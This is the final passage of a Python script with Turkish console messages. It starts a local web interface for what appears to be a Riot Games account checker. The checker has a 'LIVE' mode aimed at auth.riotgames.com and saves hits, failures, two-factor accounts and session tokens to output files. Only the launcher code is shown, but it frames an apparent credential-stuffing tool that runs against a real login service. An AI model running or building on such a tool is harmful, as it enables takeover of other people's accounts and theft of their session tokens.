        print("  [!] requests/curl_cffi yok — gercek kontrol icin: pip install requests curl-cffi")
        print("      (Mock mod ile arayuz yine de calisir: --mock)")
    mode = "MOCK (simulasyon)" if args["mock"] else "LIVE (auth.riotgames.com)"
    print(f"  [*] mod     : {mode}")
    print(f"  [*] adres   : http://localhost:{args['port']}")
    print(f"  [*] ciktilar: out_riot_<timestamp>/  (hits.txt, fails.txt, tfa.txt, tokens.txt, all.txt, summary.json)")
    print()
    if _WAITRESS:
        _ws_serve(app, host="127.0.0.1", port=args["port"], threads=16,
                  channel_timeout=60, max_request_body_size=10 * 1024 * 1024)
    else:
        app.run(host="127.0.0.1", port=args["port"], threaded=True)


if __name__ == "__main__":
    main()
